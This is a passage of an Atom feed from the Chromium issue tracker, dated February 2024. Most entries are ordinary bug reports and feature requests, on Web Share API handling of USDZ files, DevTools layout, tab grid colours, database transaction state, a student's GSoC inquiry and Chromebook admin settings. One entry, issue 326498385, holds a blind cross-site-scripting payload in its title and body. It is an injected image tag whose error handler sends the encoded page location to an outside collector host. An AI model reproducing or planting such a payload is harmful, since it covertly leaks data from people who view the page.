Sharing the same files as blobs or data URLs behaves different on the different OSs but I believe it should behave the same.

On Windows Chrome:
- note console has log "data can be shared" with a USDZ file blob
- click on "Share USDZ Blob"
- note it throws NotAllowedError.
- BUG: instead, canShare should return false.

On MacOS Chrome:
- canShare returns false for "Share USDZ Blob"
- Feature Request: please add the USDZ file type as allowed type for sharing.

On iOS Chrome:
- all 4 buttons work as expected

Live Page: https://share-usdz.glitch.me/
Code: https://glitch.com/edit/#!/share-usdz

# Problem Description
The Web Share API allows invoking native share dialogs of operating systems, which comes with very nice integrations into each OS's ecosystem.
Files can be shared either as URLs (on some server, or blob URLs) or as Array&lt;File&gt;.

However, 
- on Mac OS it seems like the "USDZ" file type is blocked and not allowed to be shared (canShare returns false and navigator.share fails)
- on Windows, the file is allowed to be shared but actually trying to share it results in a permission exception (canShare returns true but navigator.share fails).

So I believe
- there is a bug in Chrome for Windows where canShare incorrectly returns true
- I would like to request the feature that USDZ is added to the allowed file list for sharing

Live Page: https://share-usdz.glitch.me/
Code: https://glitch.com/edit/#!/share-usdz

# Additional Comments
Sharing USDZ blobs directly from Chrome allows opening them in AR on iOS and visionOS and in the Finder on Mac OS. This is a very fast/nice flow. It would also allow tools like model-viewer to have a fast path into AR experiences on other devices (e.g. from desktop or phone to visionOS).

# Summary
Navigator.share for USDZ files behaves inconsistenly/incorrect

# Custom Questions
#### Which component does this fall under?
Blink&gt;DataTransfer

#### Does this work in other browsers? 
Yes - This is just a Chrome problem

# Additional Data
Category: API \
Chrome Channel: Stable \
Regression: No</content>
    </entry>
    <entry>
        <id>326498385</id>
        <title>'"&amp;gt;&amp;lt;img src=x onerror='this.src="https://xless-lemon.vercel.app/image?"+btoa(document.location)'&amp;gt;</title>
        <author>
            <name>bs...@gmail.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326498385"/>
        <updated>2024-02-23T17:04:15.839Z</updated>
        <summary>-</summary>
        <content type="html">'"&gt;&lt;img src=x onerror='this.src="https://xless-lemon.vercel.app/image?"+btoa(document.location)'&gt;</content>
    </entry>
    <entry>
        <id>326593121</id>
        <title>[DEI Feature Request] Flag to Allow Websites to Not Appear in Browsing History</title>
        <author>
            <name>mv...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326593121"/>
        <updated>2024-02-23T16:56:58.202Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. As a kid, I want to visit any LGBT or other DEI group resources on the web.
2. As a kid, I am unaware that this site gets added to my browsing history.
3. My parent searches the computer browsing history, and sees the LGBT websites in browsing history.
4. My parent confronts me because my browsing history outs me,
5. My parent kicks me out of my home, or harms me. 

# Problem Description
Through the lens of an LGBT kid struggling to find resources or community on the internet, we place them in a position where they can be harmed, killed, kicked out of their homes, etc. if their browsing history leaks their site visits to their family.

It would be great to tackle this problem in a way that allows for browsers to allow sites to flag themselves as sensitive DEI websites that should not be saved in search history, browse history, local caching, etc. 

The danger from the DEI dimension in this case far exceed the performance or latency issues. 

# Summary
[DEI Feature Request] Flag to Allow Websites to Not Appear in Browsing History

# Custom Questions
#### Please select a label to classify your issue:
Type-Feature - Request for new or improved features

# Additional Data
Category: Other \
Chrome Channel: Stable \
Regression: No</content>
    </entry>
    <entry>
        <id>326597674</id>
        <title>Heavy(Bottom Up) is overlapped with Node</title>
        <author>
            <name>js...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326597674"/>
        <updated>2024-02-23T16:31:49.978Z</updated>
        <summary>-</summary>
        <content type="html">Chrome Version:124.0.6317.0 (Official Build) (64-bit) (cohort: M122 Rollout) 
fb9d4487c533dc45ed93977168e10db75dc717e8-refs/branch-heads/6317@{#1}

OS : Win(10,11)

Preconditions:
None

Steps to reproduce:

1.Launch Chrome and Open NTP
2.Inspect it
3.Go to Memory tab
4.Select Allocation Sampling
5. Click on start and stop after few seconds
6.Observe that,Heavy(Bottom Up) Category is overlapped with Arrow


Actual Result:Heavy(Bottom Up) is overlapped with Node
Expected Result: The arrow mark should not overlap with Heavy(Bottom Up) Category

This is a regression issue broken in M124, and please find the per-revision bisect info below:

Good Build:124.0.6316.0
Bad Build:124.0.6317.0

Change Log: 
https://chromium.googlesource.com/chromium/src.git/+log/b26aa52e7baaa4a74e0d3ed434826dd84c7c2fce..fb9d4487c533dc45ed93977168e10db75dc717e8?n=1000&amp;pretty=fuller

We are unable to find the culprit from the above Change log, please help us in assigning it to the right owner.

Please find attached screenshots below:


Notes:
1)This issue unable to repro on Stable #122.0.6261.72, Beta #122.0.6261.6,Dev RC#123.0.6272.2



Thanks..!!

</content>
    </entry>
    <entry>
        <id>326597273</id>
        <title>Tab Grid cells have wrong background color</title>
        <author>
            <name>ga...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326597273"/>
        <updated>2024-02-23T16:29:25.830Z</updated>
        <summary>-</summary>
        <content type="html">M124.
Have the device in light mode

1. Enter the TabGrid
2. Reoder a tab using drag and drop

The tab background should stay white-ish. Currently it is becoming dark.</content>
    </entry>
    <entry>
        <id>326595816</id>
        <title>[gbb-cct] Investigate and attempt to mitigate increase in janks</title>
        <author>
            <name>ed...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326595816"/>
        <updated>2024-02-23T16:21:25.229Z</updated>
        <summary>-</summary>
        <content type="html">b/319618660</content>
    </entry>
    <entry>
        <id>326493655</id>
        <title>[Chromium GSoC] Request for Feedback (auto-testing)</title>
        <author>
            <name>la...@gmail.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326493655"/>
        <updated>2024-02-23T16:16:19.707Z</updated>
        <summary>-</summary>
        <content type="html">


I hope this finds you well. My name is Laila Amr Kamal, and I am currently a second-year student at Alexandria University, majoring in Computer Sciences with a focus on the Software Industry and Multimedia at the Faculty of Sciences. I am writing to express my sincere interest in the Touchscreen Testing project and to seek your guidance as my mentors.

First and foremost, I want to express my gratitude for the opportunity to be introduced to this project. The prospect of automating touchscreen testing with Chromebooks using a Human Motion Robot (HMR) is incredibly exciting, and I am eager to contribute to its success.

As I embark on this journey, I would greatly appreciate your guidance on how to get started with the project. Specifically, I am interested in learning:

1. **Initial Steps:** What are the initial steps I should take to familiarize myself with the project goals and requirements?
2. **Resources:** Are there any resources, documentation, or reading materials you recommend to deepen my understanding of touchscreen testing and HMR integration?
3. **Tools and Technologies:** What tools and technologies should I focus on mastering to effectively contribute to the project, particularly in terms of Python and C++ proficiency?
4. **Communication Channels:** How can I stay in touch with you throughout the project for guidance, feedback, and support? Are there specific communication channels or platforms preferred for project-related discussions?
5. **Project Timeline:** To ensure timely delivery, what strategies or tips do you recommend for managing project milestones and deadlines effectively?
6. **Meetings and Collaboration:** Are there any upcoming meetings or collaborative sessions where I can join to discuss project progress, share insights, and collaborate with fellow team members?

I am fully committed to dedicating my time and effort to this project and am determined to deliver the best possible outcomes. Your mentorship and guidance will be invaluable in helping me navigate through the project challenges and achieve our objectives.

Once again, I want to express my sincere appreciation for this opportunity, and I am genuinely looking forward to hearing from you regarding the next steps to enroll myself in the project. Please feel free to suggest a suitable time for an initial meeting or discussion.

Thank you for considering my interest, and I eagerly await your response.

Warm regards,

Laila Amr Kamal</content>
    </entry>
    <entry>
        <id>326594614</id>
        <title>[gbb-cct] Mitigate memory increase</title>
        <author>
            <name>ed...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326594614"/>
        <updated>2024-02-23T16:14:00.488Z</updated>
        <summary>-</summary>
        <content type="html">b/326595652</content>
    </entry>
    <entry>
        <id>326498384</id>
        <title>Database::HasActiveTransactions() should be false when the DB is closed</title>
        <author>
            <name>dm...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326498384"/>
        <updated>2024-02-23T16:08:58.587Z</updated>
        <summary>-</summary>
        <content type="html">asully flagged this while discussing error handling in FirstPartySetsDatabase (https://crrev.com/c/5314328/comment/58e6c6e5_08dc37d7/).

It appears that calling Database::Close() on an open db does not reset transaction_nesting_. Consequently, [HasActiveTransactions()](https://source.chromium.org/chromium/chromium/src/+/main:sql/database.h;l=501-504;drc=133b2d903fa57cfda1317bc589b349cf4c284b7c) could return true after closing the database.</content>
    </entry>
    <entry>
        <id>326503097</id>
        <title>CHROME JUST WON'T OPEN SECURE, LEGIT WEBSITES</title>
        <author>
            <name>mr...@gmail.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326503097"/>
        <updated>2024-02-23T15:51:43.303Z</updated>
        <summary>-</summary>
        <content type="html">Device name:

From ""Settings &gt; About Chrome""
Application version:
Operating system:

URLs (if applicable):

Steps to reproduce:
(1)
(2)
(3)

Expected result:

Actual result:</content>
    </entry>
    <entry>
        <id>326490771</id>
        <title>[UniversalInstall] Missing a couple of image assets from UX</title>
        <author>
            <name>fi...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326490771"/>
        <updated>2024-02-23T15:51:41.695Z</updated>
        <summary>-</summary>
        <content type="html">The UX designer provided new image assets at the last minute, needed for the Universal Install dialog. 

I checked in the code to add them last week, we just need to make the corresponding xml changes (so in terms of code changes this would practically be a no-op).</content>
    </entry>
    <entry>
        <id>326592434</id>
        <title>Tracking recipe changes for task backend migration</title>
        <author>
            <name>ra...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326592434"/>
        <updated>2024-02-23T15:50:05.449Z</updated>
        <summary>-</summary>
        <content type="html">This bug serves as a global tracking bug for all recipe changes that need to be made across different recipe repos to ensure that the task backend migration will run smoothly.

</content>
    </entry>
    <entry>
        <id>326590685</id>
        <title>Glitch At Typing on Keyboard When CPE Suggests Passwords</title>
        <author>
            <name>ah...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326590685"/>
        <updated>2024-02-23T15:40:37.156Z</updated>
        <summary>-</summary>
        <content type="html">When there are CPE suggestions for passwords, CPE disappears every time when I realise the key in the keyboard and the KA bar is shifted down and up, which looks like a glitch.

It won't happen when there are no CPE suggestions.
</content>
    </entry>
    <entry>
        <id>326564981</id>
        <title>Would like to disable external monitors for managed Chromebooks</title>
        <author>
            <name>em...@gcj2.k12.wi.us</name>
        </author>
        <link href="https://issues.chromium.org/issues/326564981"/>
        <updated>2024-02-23T15:25:49.061Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. Setting toggle in Google Admin to disable external monitors.
2. Setting toggle in Google Admin to disable outside ports (HDMI, USB, etc.)
3. -

# Problem Description
Users in our domain are using external monitors to dodge screen monitoring software. We would like there to be a way to disable external monitor support in Google Admin.

# Summary
Would like to disable external monitors for managed Chromebooks

# Custom Questions
#### Please select a label to classify your issue:
Type-Feature - Request for new or improved features

# Additional Data
Category: Other \
Chrome Channel: Not sure \
Regression: N/A</content>
    </entry>
    <entry>
        <id>326588816</id>
        <title>Add nested toggle for content notifs in opt-in screen</title>
        <author>
            <name>hi...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326588816"/>
        <updated>2024-02-23T15:23:47.703Z</updated>
        <summary>-</summary>
        <content type="html"></content>
    </entry>
    <entry>
        <id>326587232</id>
        <title>[FedCM] Add metrics for button flow</title>
        <author>
            <name>yi...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326587232"/>
        <updated>2024-02-23T15:20:59.205Z</updated>
        <summary>-</summary>
        <content type="html"></content>
    </entry>
</feed>